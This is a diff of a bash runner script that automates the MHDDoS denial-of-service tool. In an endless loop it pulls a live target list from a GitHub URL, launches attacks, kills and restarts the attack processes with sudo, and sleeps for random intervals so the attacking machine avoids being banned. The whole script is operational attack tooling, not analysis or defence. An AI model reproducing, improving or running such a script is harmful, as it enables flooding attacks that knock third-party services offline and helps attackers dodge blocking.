@@ -4,6 +4,11 @@ restart_interval=1m
 
 num_of_copies="${1:-1}"
 
+#Just in case kill previous copy of mhddos_proxy
+echo "Killing all old processes with MHDDoS"
+sudo pkill -f runner.py
+sudo pkill -f ./start.py
+echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
 # for Docker
 #echo "Kill all useless docker-containers with MHDDoS"
 #sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
@@ -54,13 +59,7 @@ do
 		bash runner.sh $threads $rpc $proxy_interval $debug&
 		exit
 	fi
-	clear
-	echo -e "\nRESTARTING\n"
-   	#Just in case kill previous copy of mhddos_proxy
-   	echo "Killing all old processes with MHDDoS"
-   	sudo pkill -f runner.py
-   	sudo pkill -f ./start.py
-   	echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+	#clear
    	
    	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
    	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]" | wc -l)
@@ -99,10 +98,22 @@ do
 	echo -e "\033[0;34m#####################################\033[0;0m\n"
    	echo -e "\n\033[1;35mDDoS is up and Running, next update of targets list in $restart_interval\033[1;0m"
    	sleep $restart_interval
+	clear
    	
+   	#Just in case kill previous copy of mhddos_proxy
+   	echo "Killing all old processes with MHDDoS"
+   	sudo pkill -f runner.py
+   	sudo pkill -f ./start.py
+   	echo -e "\n\033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+	
    	no_ddos_sleep="$(shuf -i 1-10 -n 1)m"
-   	echo -e "\n\033[46mSleeping $no_ddos_sleep to protect your machine...\033[0m\n"
-   	echo "Kill all useless docker-containers with MHDDoS"
-   	sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-   	echo "Docker useless containers killed"
+   	echo -e "\n\033[46mSleeping $no_ddos_sleep to protect your machine from ban...\033[0m\n"
+	sleep $no_ddos_sleep
+	
+	echo -e "\n\033[42mRESTARTING\033[0m\n"
+	
+	# for docker
+   	#echo "Kill all useless docker-containers with MHDDoS"
+   	#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
+   	#echo "Docker useless containers killed"
 done
